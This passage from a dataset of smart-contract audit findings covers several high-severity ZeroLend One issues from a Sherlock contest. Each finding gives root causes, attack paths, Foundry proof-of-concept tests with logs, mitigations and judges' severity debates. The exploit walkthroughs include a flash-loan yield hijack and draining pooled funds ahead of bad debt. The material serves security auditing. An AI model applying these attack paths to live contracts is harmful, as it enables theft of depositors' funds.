      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/275 \n\n## Found by \nA2-security, Nihavent, Obsidian, joshuajee, tallo\n### Summary\n\nWhen bad debt is accumulated, it should be socialised amongst all suppliers.\n\nThe issue is that the protocol does not do this, instead only the last users to withdraw funds will feel the effects of the bad debt.\n\nIf a pool experiences bad debt, the first users to withdraw will experience 0 loss, while the last to withdraw will experience a severe loss.\n\n### Root Cause\nThe [withdrawn](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L106) assets is calculated as `shares * liquidityIndex` which does not take into account bad debt\n\nThis means that even if bad debt accrues, the first users to withdraw will be able to withdraw their shares to assets at a good rate, leaving the last users with all the loss. \n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n**This attack path is shown in the PoC:**\n\n1. User A supplies 50 ETH to the pool\n2. User B supplies 50 ETH to the pool\n3. A bad debt liquidation occurs, so the liquidator only repaid 64 ETH out of the 100 ETH\n4. User A is still able to withdraw their 50 ETH\n5. User B is left with less than 14 ETH able to be withdrawn\n\n### Impact\n\nHuge fund loss for the suppliers last to withdraw\n\nEarly withdrawers effectively steal from the late withdrawers\n\n### PoC\n\nAdd the following test to `PoolLiquidationTests.t.sol`\n\n```solidity\nfunction test__BadDebtLiquidationIsNotSocialised() external {\n    // Setup users\n    address supplierOfTokenB = address(124343434);\n    address liquidator = address(8888);\n    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); \n    _mintAndApprove(bob, tokenB, 50 ether, address(pool)); \n    _mintAndApprove(supplierOfTokenB, tokenB, 50 ether, address(pool)); \n    _mintAndApprove(liquidator, tokenB, 100 ether, address(pool)); \n    console.log(\"bob balance before: %e\", tokenB.balanceOf(bob));\n    // alice supplies 134 ether of tokenA\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 268 ether, 0); \n    vm.stopPrank();\n\n    // bob supplies 50 ether of tokenB\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, 50 ether, 0); \n    vm.stopPrank();\n\n    // supplierOfTokenB supplies 50 ether of tokenB\n    vm.startPrank(supplierOfTokenB);\n    pool.supplySimple(address(tokenB), supplierOfTokenB, 50 ether, 0); \n    vm.stopPrank();\n\n    // alice borrows 100 ether of tokenB\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, 100 ether, 0); \n    vm.stopPrank();\n\n    // Drops the collateral price to make the position liquidatable\n    // the drop is large enough to make the position in bad debt\n    oracleA.updateAnswer(5e7); \n\n    // liquidator liqudiates the position\n    // note that he takes all of alice's collateral\n    vm.startPrank(liquidator);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 64 ether);\n\n    // bob sees that the position is in bad debt and quickly withdraws all that he supplied\n    // bob does not experience any loss from the bad debt\n    vm.startPrank(bob);\n    pool.withdrawSimple(address(tokenB), bob, 50 ether, 0);\n\n    // supplierOfTokenB tries to withdraw his funds but it reverts, since there is none left\n    vm.startPrank(supplierOfTokenB);\n    vm.expectRevert();\n    pool.withdrawSimple(address(tokenB), supplierOfTokenB, 50 ether, 0);\n\n    // the maximum amount supplierOfTokenB can withdraw is 13 ether of tokenB\n    // since that is all that is left in the pool\n    pool.withdrawSimple(address(tokenB), supplierOfTokenB, 13 ether, 0);\n\n    // log the final state\n    console.log(\"The following is the final state\");\n\n    // show that there is no more tokenB left in the pool after bob withdrew everything\n    uint256 PoolBalanceOfB = tokenB.balanceOf(address(pool));\n    console.log(\"Remaining balance of tokenB in the pool = %e\", PoolBalanceOfB);\n\n    // show that bob got back the 50 ether he deposited\n    uint256 BobBalanceOfB = tokenB.balanceOf(bob);\n    console.log(\"bob's balance of tokenB = %e\", BobBalanceOfB);\n\n    // show that supplierOfTokenB only got back 13 ether of tokenB\n    uint256 SupplierBalanceOfB = tokenB.balanceOf(supplierOfTokenB);\n    console.log(\"SupplierBalanceOfB balance of tokenB = %e\", SupplierBalanceOfB);\n\n    uint256 aliceCollateral = pool.getBalance(address(tokenA), alice, 0);\n    console.log(\"aliceCollateral =%e \", aliceCollateral);\n  }\n```\n**Console output:**\n\n```bash\nRan 1 test for test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[PASS] test__BadDebtLiquidationIsNotSocialised() (gas: 1089597)\nLogs:\n  The following is the final state\n  Remaining balance of tokenB in the pool = 8.09523809523809524e17\n  bob's balance of tokenB = 5e19\n  SupplierBalanceOfB balance of tokenB = 1.3e19\n  aliceCollateral =0e0 \n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.34ms (1.66ms CPU time)\n\nRan 1 test suite in 11.14ms (4.34ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n### Mitigation\n\nSocialise the loss among all depositors",
      "summary": "\nThis bug report is about an issue where the loss from bad debt is not shared among all suppliers in a protocol. Instead, only the last users to withdraw their funds will experience a significant loss. This means that the earlier users who withdraw will not be affected by the bad debt, while the later users will suffer a large loss. The root cause of this issue is that the assets withdrawn are calculated based on shares and liquidity index, which does not take into account bad debt. This allows early withdrawers to essentially steal from the late withdrawers. A proof of concept (PoC) has been provided to demonstrate this attack path. The impact of this bug is a huge loss for the suppliers who are the last to withdraw their funds. The suggested mitigation is to socialize the loss among all depositors to prevent this issue from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/275",
      "tags": [],
      "finders": [
        "Nihavent",
        "tallo",
        "joshuajee",
        "Obsidian",
        "A2-security"
      ]
    },
    {
      "id": "41816",
      "title": "H-6: Malicious pool deployer can set a malicious interest rate contract to lock funds of vault depositors",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233 \n\n## Found by \nA2-security, Obsidian, iamnmt\n### Summary\n\nOnce vault depositors have deposited funds into a pool, a malicious pool creator can upgrade the `interestRateStrategy` contract (using `PoolConfigurator.setReserveInterestRateStrategyAddress()` to make all calls to it revert.\n\nAs a result any function of the protocol that calls `updateInterestRates()` will revert because `updateInterestRates()` makes the following [call](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L160-L171):\n```solidity\n(vars.nextLiquidityRate, vars.nextBorrowRate) = IReserveInterestRateStrategy(_reserve.interestRateStrategyAddress)\n      .calculateInterestRates(\n      /* PARAMS */\n    );\n```\n\nThe main impact is that now withdrawals will revert because `executeWithdraw()` calls `updateInterestRates()` which will always revert, so the funds that vault users deposited into this pool are lost forever.\n\n### Root Cause\n\nAllowing the pool deployer to specify any `interestRateStrategyAddress`\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Vault users deposit into the pool\n2. the deployer sets their `interestRateStrategy` contract to make all calls to it revert\n3. All calls to withdraw funds from the pool will revert, the vault depositors have lost their funds\n\n### Impact\n\nAll the funds deposited to the pool from the vault will be lost\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nUse protocol whitelisted interest rate calculation contracts\n\n\n\n## Discussion\n\n**nevillehuang**\n\nInvalid, require malicious admin\n\n> Essentially we expect all permissioned actors to behave rationally.\n\n**iamnmt**\n\nEscalate\n\nPer the contest's `README`\n\n> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nThis statement makes this issue valid.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> Per the contest's `README`\n> \n> > There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n> \n> This statement makes this issue valid.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**zarkk01**\n\nIMO, the issue is **invalid** due to this statement of the sponsor.\n\n> Essentially we expect all permissioned actors to behave rationally.\n\nIt is, absolutely, irrational for a deployer to set a malicious interest rate contract since he has **nothing** to earn out of this behaviour. \n\n\n**0xSpearmint**\n\nThe permissioned actors the protocol refers to are the protocol controlled `PoolConfigurator` and `owner` roles. They can be expected to act rationally. \n\nThis issue involves a malicious pool deployer (which can be anyone).\n\nDeploying pools is permission-less, which is why the protocol was interested in such issues as they clearly stated in the README:\n>There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\n**cvetanovv**\n\nI agree with the escalation of this issue to be High severity. For more information on what I think about the rule, you can see this comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2413297520\n\nPlanning to accept the escalation and make this issue High severity.\n\n**WangSecurity**\n\nResult:\nHigh \nHas duplicates\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [iamnmt](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233/#issuecomment-2391294265): accepted\n\n**DemoreXTess**\n\n@cvetanovv Can we reconsider this issue per this comment : https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2427578837_\n\nThe report wrongly states that the funds are locked forever. ZeroLend has permission to make changes on the pools. Users can get back their funds after adjustment by ZeroLend\n\n**0xSpearmint**\n\nThe referenced [comment ](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234#issuecomment-2427578837)is not accurate.\n\nEven if the protocol sets a new IRM through [this only configurator function](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/Pool.sol#L150-L158), the pool admin can instantly change it back to the malicious IRM using [this only pool admin function](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/manager/PoolConfigurator.sol#L105-L111). \n\n**cvetanovv**\n\nI agree with @0xSpearmint comment. Even if ZeroLend makes any changes, the malicious pool admin can immediately roll back the previous configuration.\n\n**DemoreXTess**\n\n@cvetanovv  \nIs there a problem in this one, it says escalation resolved with has duplicates but the label is not added.\n\n**cvetanovv**\n\n@DemoreXTess That's not a problem. The labels of duplicate issues will be added after all escalations are resolved.\n\n**Joshuajee**\n\n@cvetanovv and @WangSecurity ,\n\nSorry, this might be coming late, but I don't believe that this issue meets the criteria of becoming a High because;\n\n1. It relies on the pool deployer becoming Malicious, what are the chances?\n2. It also relies on the vault managers not doing their due diligence on checking if the pool's strategy is indeed safe.\n3. Vault Managers are risk managers and should do their thorough checks on every pool, including oracles and strategy contracts before adding such. \n\nThe whole reason for validating this is that the pool deployer can hurt the vault manager, but the vault manager should be rational enough to check the rate strategy contract, before trusting a pool.\n\n\n**cvetanovv**\n\n> @cvetanovv and @WangSecurity ,\n> \n> Sorry, this might be coming late, but I don't believe that this issue meets the criteria of becoming a High because;\n> \n> 1. It relies on the pool deployer becoming Malicious, what are the chances?\n> 2. It also relies on the vault managers not doing their due diligence on checking if the pool's strategy is indeed safe.\n> 3. Vault Managers are risk managers and should do their thorough checks on every pool, including oracles and strategy contracts before adding such.\n> \n> The whole reason for validating this is that the pool deployer can hurt the vault manager, but the vault manager should be rational enough to check the rate strategy contract, before trusting a pool.\n\n1. The pool deployer does not need to become malicious. He is malicious by default if it can hurt the Vault.\n2. I agree here, and every Vault Manager should do their own checking, but it doesn't matter because, at any time, he can change the interest rate because he is malicious.\n3. Same as point 2. They are malicious by default, and even if the vault managers do the best check, the pool manager can increase the interest rate at any time.\n\n**Joshuajee**\n\n@cvetanovv,\n\nI agree you are totally right here.\n\nI think that my earlier complaint only affects https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234\n\nBecause oracles can not be changed after deployment",
      "summary": "\nThis bug report discusses an issue in which a malicious pool creator can set a malicious interest rate contract in a vault, causing all calls to it to revert. This results in users losing their funds when trying to withdraw from the pool. The root cause is allowing the pool deployer to specify any interest rate strategy address. This issue has been escalated to High severity and has duplicates. There is some discussion about the severity of the issue, with some arguing that it is not a High severity issue because it relies on the pool deployer becoming malicious and the vault manager not doing due diligence. However, others argue that the pool deployer is malicious by default and can change the interest rate at any time, making it a High severity issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233",
      "tags": [],
      "finders": [
        "A2-security",
        "Obsidian",
        "iamnmt"
      ]
    },
    {
      "id": "41815",
      "title": "H-5: `LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228 \n\n## Found by \n000000, A2-security, Bigsam, Honour, dhank, ether\\_sky, imsrybr0, lemonmon, thisvishalsingh, trachev, zarkk01\n### Summary\n\n`LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency, ultimately impacting regular flows (.e.g borrows, withdrawals, redemptions, ...) in the protocol for the different actors (.i.e Pools users, Curated Vaults and their users, NFT Positions users).\n\n### Root Cause\n\n[LiquidationLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol)\n```solidity\n// ...\nlibrary LiquidationLogic {\n  // ...\n  function executeLiquidationCall(\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 => address) storage reservesList,\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances,\n    mapping(address => DataTypes.ReserveSupplies) storage totalSupplies,\n    mapping(bytes32 => DataTypes.UserConfigurationMap) storage usersConfig,\n    DataTypes.ExecuteLiquidationCallParams memory params\n  ) external {\n    // ...\n\n    (vars.actualCollateralToLiquidate, vars.actualDebtToLiquidate, vars.liquidationProtocolFeeAmount) = // <==== Audit \n    _calculateAvailableCollateralToLiquidate(\n      collateralReserve,\n      vars.debtReserveCache,\n      vars.actualDebtToLiquidate,\n      vars.userCollateralBalance,\n      vars.liquidationBonus,\n      IPool(params.pool).getAssetPrice(params.collateralAsset),\n      IPool(params.pool).getAssetPrice(params.debtAsset),\n      IPool(params.pool).factory().liquidationProtocolFeePercentage()\n    );\n\n    // ...\n\n    _burnCollateralTokens(\n      collateralReserve, params, vars, balances[params.collateralAsset][params.position], totalSupplies[params.collateralAsset]\n    ); // <==== Audit\n\n    if (vars.liquidationProtocolFeeAmount != 0) {\n      // ...\n\n      IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);  // <==== Audit\n    }\n\n    // ...\n  }\n\n   function _burnCollateralTokens(\n    DataTypes.ReserveData storage collateralReserve,\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    LiquidationCallLocalVars memory vars,\n    DataTypes.PositionBalance storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal {\n    // ...\n    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate, collateralReserveCache.nextLiquidityIndex); // <==== Audit : actualCollateralToLiquidate doesn't include liquidation fees\n    IERC20(params.collateralAsset).safeTransfer(msg.sender, vars.actualCollateralToLiquidate);\n  }\n\n  // ...\n\n  function _calculateAvailableCollateralToLiquidate(\n    DataTypes.ReserveData storage collateralReserve,\n    DataTypes.ReserveCache memory debtReserveCache,\n    uint256 debtToCover,\n    uint256 userCollateralBalance,\n    uint256 liquidationBonus,\n    uint256 collateralPrice,\n    uint256 debtAssetPrice,\n    uint256 liquidationProtocolFeePercentage\n  ) internal view returns (uint256, uint256, uint256) {\n    // ...\n\n    if (liquidationProtocolFeePercentage != 0) {\n      vars.bonusCollateral = vars.collateralAmount - vars.collateralAmount.percentDiv(liquidationBonus);\n      vars.liquidationProtocolFee = vars.bonusCollateral.percentMul(liquidationProtocolFeePercentage);\n      return (vars.collateralAmount - vars.liquidationProtocolFee, vars.debtAmountNeeded, vars.liquidationProtocolFee);  // <==== Audit\n    } else {\n      return (vars.collateralAmount, vars.debtAmountNeeded, 0);\n    }\n  }\n}\n```\n\n[PositionBalanceConfiguration](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L85-L96)\n```solidity\n  function withdrawCollateral(\n    DataTypes.PositionBalance storage self,\n    DataTypes.ReserveSupplies storage supply,\n    uint256 amount,\n    uint128 index\n  ) internal returns (uint256 sharesBurnt) {\n    sharesBurnt = amount.rayDiv(index);\n    require(sharesBurnt != 0, PoolErrorsLib.INVALID_BURN_AMOUNT);\n    self.lastSupplyLiquidtyIndex = index;\n    self.supplyShares -= sharesBurnt; // <==== Audit\n    supply.supplyShares -= sharesBurnt; // <==== Audit\n  }\n```\n\nWhen there are protocol liquidation fees, `_burnCollateralTokens` doesn't account for liquidation fees when withrawing the collateral, leading to the pool and actor having more supply shares than reality.\n\n### Internal pre-conditions\n\nProtocol liquidations fees are set.\n\n### External pre-conditions\n\nN/A\n\n### Attack Path\nNot an attack path per say as this happens in every liquidation when there are liquidation fees.\n\n1. Alice supplies `tokenA`\n2. Bob supplies `tokenB`\n3. Alice borrows `tokenB`\n4. Alice becomes liquidatable\n5. Bob liquidates Alice\n\n### Impact\n\n* Incorrect accounting : pool and actor supply shares are higher than reality, allowing a liquidated actor to borrow more than what they should really be able to for example.\n* Pools insolvency : since the liquidation fees are transferred to the treasury from the pool but not reflected on the pool and actor supply shares, the actor can withdraw them again at the expense of other actors. This leads to the other actors not being able to fully withdraw their provided collateral and potentially disrupting functionality such as Curated Vaults reallocation where the withdrawn amount cannot be controlled.\n\n### PoC\n\n#### Test\n```solidity\n  function testLiquidationWithFees() external {\n    poolFactory.setLiquidationProtcolFeePercentage(0.05e4);\n\n    _mintAndApprove(alice, tokenA, 3000 ether, address(pool));\n    _mintAndApprove(bob, tokenB, 5000 ether, address(pool));\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, 3000 ether, 0);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 1000 ether, 0);\n    pool.borrowSimple(address(tokenB), alice, 375 ether, 0);\n    vm.stopPrank();\n\n    oracleB.updateAnswer(2.5e8);\n\n    vm.prank(bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, type(uint256).max);\n\n    assertEq(pool.getBalance(address(tokenA), alice, 0), tokenA.balanceOf(address(pool)));\n  }\n```\n\n#### Results\n```console\nforge test --match-test testLiquidationWithFees\n[⠢] Compiling...\nNo files changed, compilation skipped\n\nRan 1 test for test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[FAIL. Reason: assertion failed: 17968750000000000000 != 15625000000000000000] testLiquidationWithFees() (gas: 1003975)\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.25ms (1.62ms CPU time)\n\nRan 1 test suite in 347.96ms (5.25ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[FAIL. Reason: assertion failed: 17968750000000000000 != 15625000000000000000] testLiquidationWithFees() (gas: 1003975)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n```\n\n### Mitigation\n\n```diff\ndiff --git a/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol b/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol\nindex e89d626..0a48da6 100644\n--- a/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol\n+++ b/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol\n@@ -225,7 +225,7 @@ library LiquidationLogic {\n     );\n\n     // Burn the equivalent amount of aToken, sending the underlying to the liquidator\n-    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate, collateralReserveCache.nextLiquidityIndex);\n+    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate + vars.liquidationProtocolFeeAmount, collateralReserveCache.nextLiquidityIndex);\n     IERC20(params.collateralAsset).safeTransfer(msg.sender, vars.actualCollateralToLiquidate);\n   }\n```",
      "summary": "\nIssue H-5 is a problem with the code `LiquidationLogic@_burnCollateralTokens` in the project 2024-06-new-scope-judging. This code does not account for liquidation fees when withdrawing collateral during a liquidation process. This leads to incorrect accounting and can cause the pools to become insolvent, affecting regular processes in the protocol for different users. The root cause of this issue is that the code does not include the liquidation fees when calculating the available collateral to liquidate. This can have a negative impact on the protocol, such as allowing liquidated users to borrow more than they should be able to. A possible solution to this problem is to update the code to include the liquidation fees when withdrawing collateral. ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228",
      "tags": [],
      "finders": [
        "lemonmon",
        "imsrybr0",
        "zarkk01",
        "thisvishalsingh",
        "000000",
        "trachev",
        "ether\\_sky",
        "Honour",
        "dhank",
        "A2-security",
        "Bigsam"
      ]
    },
    {
      "id": "41814",
      "title": "H-4: An attacker can hijack the `CuratedVault`'s matured yield",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199 \n\n## Found by \n0xAlix2, 0xc0ffEE, A2-security, JCN, Obsidian, TessKimy, Varun\\_05, dhank, ether\\_sky, iamnmt, trachev, zarkk01\n### Summary\n\n`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning will cause the matured yield to be distributed to users that do not supply to the vault before the yield accrues. An attacker can exploit this to hijack the `CuratedVault`'s matured yield.\n\n### Root Cause\n\n`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372\n\n```solidity\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nLet's have:\n- A vault has a total assets of `totalAssets`\n- `X` amount of yield is accrued from `T1` to `T2`\n\n1. The attacker takes a flash loan of `flashLoanAmount`\n2. The attacker deposits `flashLoanAmount` at `T2` to the vault. Since `CuratedVault#totalAssets` does not update pool's `liquidityIndex`, the minted shares are calculated based on the total assets at `T1`.\n3. The attacker redeems all the shares and benefits from `X` amount of yield.\n4. The attacker repays the flash loan.\n\nThe cost of this attack is gas fee and flash loan fee.\n\n### Impact\n\nThe attacker hijacks `flashLoanAmount / (flashLoanAmount + totalAssets)` percentage of `X` amount of yield.\n\n`X` could be a considerable amount when:\n- The pool has high interest rate.\n- `T2 - T1` is large. This is the case for the pool with low interactions.\n\nWhen `X` is a considerable amount, the amount of hijacked funds could be greater than the cost of the attack, then the attacker will benefit from the attack.\n\n### PoC\n\nDue to a bug in `PositionBalanceConfiguration#getSupplyBalance` that we submitted in a different issue, fix the `getSupplyBalance` function before running the PoC\n\n`core/pool/configuration/PositionBalanceConfiguration.sol`\n\n```diff\nlibrary PositionBalanceConfiguration {\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-   return self.supplyShares + increase;\n+   return self.supplyShares.rayMul(index);\n  }\n}\n```\n\nRun command: `forge test --match-path test/PoC/PoC.t.sol`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {console} from 'lib/forge-std/src/Test.sol';\nimport '../forge/core/vaults/helpers/IntegrationVaultTest.sol';\n\ncontract ERC4626Test is IntegrationVaultTest {\n  address attacker = makeAddr('attacker');\n\n  function setUp() public {\n    _setUpVault();\n    _setCap(allMarkets[0], CAP);\n    _sortSupplyQueueIdleLast();\n\n    oracleB.updateRoundTimestamp();\n    oracle.updateRoundTimestamp();\n\n    uint256 vaultAssets = 10 ether;\n\n    loanToken.mint(supplier, vaultAssets);\n    vm.prank(supplier);\n    vault.deposit(vaultAssets, supplier);\n    \n    vm.prank(attacker);\n    loanToken.approve(address(vault), type(uint256).max);\n  }\n\n  function testDeposit() public {\n    collateralToken.mint(borrower, type(uint128).max);\n\n    vm.startPrank(borrower);\n    allMarkets[0].supplySimple(address(collateralToken), borrower, type(uint128).max, 0);\n    allMarkets[0].borrowSimple(address(loanToken), borrower, 8 ether, 0);\n\n    skip(100 days);\n\n    oracleB.updateRoundTimestamp();\n    oracle.updateRoundTimestamp();\n\n    uint256 vaultAssetsBefore = vault.totalAssets();\n\n    console.log(\"Vault's assets before updating reserve: %e\", vaultAssetsBefore);\n\n    uint256 snapshot = vm.snapshot();\n\n    allMarkets[0].forceUpdateReserve(address(loanToken));\n    console.log(\"Vault's accrued yield: %e\", vault.totalAssets() - vaultAssetsBefore);\n\n    vm.revertTo(snapshot);\n\n    uint256 flashLoanAmount = 100 ether;\n\n    loanToken.mint(attacker, flashLoanAmount);\n\n    vm.startPrank(attacker);\n    uint256 shares = vault.deposit(flashLoanAmount, attacker);\n    vault.redeem(shares, attacker, attacker);\n    vm.stopPrank();\n\n    console.log(\"Attacker's profit: %e\", loanToken.balanceOf(attacker) - flashLoanAmount);\n  }\n}\n```\n\nLogs:\n\n```bash\n  Vault's assets before updating reserve: 1e19\n  Vault's accrued yield: 5.62832773326440941e17\n  Attacker's profit: 5.11666157569491763e17\n```\n\nAlthough the yield accrued, the vault's assets before updating reserve is still `1e19`.\n\n### Mitigation\n\nUpdate pool's `liquidityIndex` at the beginning of `CuratedVault#totalAssets` \n\n```diff\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n+     withdrawQueue[i].forceUpdateReserve(asset());\n      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\n\n\n## Discussion\n\n**DemoreXTess**\n\nEscalate\n\nThis should be classified as high severity. Due to the outdated totalAssets, all actions that rely on totalAssets, such as supplying assets, will result in a loss of funds. The minted shares will be incorrect whenever a user supplies assets to the vault. This not only exposes the protocol to flash loan attacks but also causes a direct loss of funds for users. Therefore, the severity of the issue should be high.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This should be classified as high severity. Due to the outdated totalAssets, all actions that rely on totalAssets, such as supplying assets, will result in a loss of funds. The minted shares will be incorrect whenever a user supplies assets to the vault. This not only exposes the protocol to flash loan attacks but also causes a direct loss of funds for users. Therefore, the severity of the issue should be high.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nI agree that this issue meets the requirements for High severity:\n\n> Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nDue to the stale `totalAssets` data, all actions that depend on this function can result in user losses without requiring any external conditions to be met.\n\nPlanning to accept the escalation and make this issue High severity.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199/#issuecomment-2391738167): accepted",
      "summary": "\nThe bug report describes a vulnerability in a system called `CuratedVault` where an attacker can exploit a flaw in the code to hijack the matured yield, resulting in a loss of funds for users. The root cause of the issue is that the `CuratedVault#totalAssets` function does not update the pool's `liquidityIndex` at the beginning, which allows the attacker to manipulate the system and benefit from the accrued yield. The attack path involves the attacker taking a flash loan, depositing it into the vault, and then redeeming the shares to receive the yield. The impact of this attack can be significant, especially in pools with high interest rates and low interactions. A proof of concept (PoC) is provided to demonstrate the vulnerability. The issue has been classified as high severity and has been resolved. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199",
      "tags": [],
      "finders": [
        "TessKimy",
        "zarkk01",
        "JCN",
        "0xc0ffEE",
        "trachev",
        "ether\\_sky",
        "0xAlix2",
        "dhank",
        "Varun\\_05",
        "Obsidian",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41813",
      "title": "H-3: Liquidation can be DOSed due to lack of liquidity on collateral asset reserve",
      "impact": "HIGH",
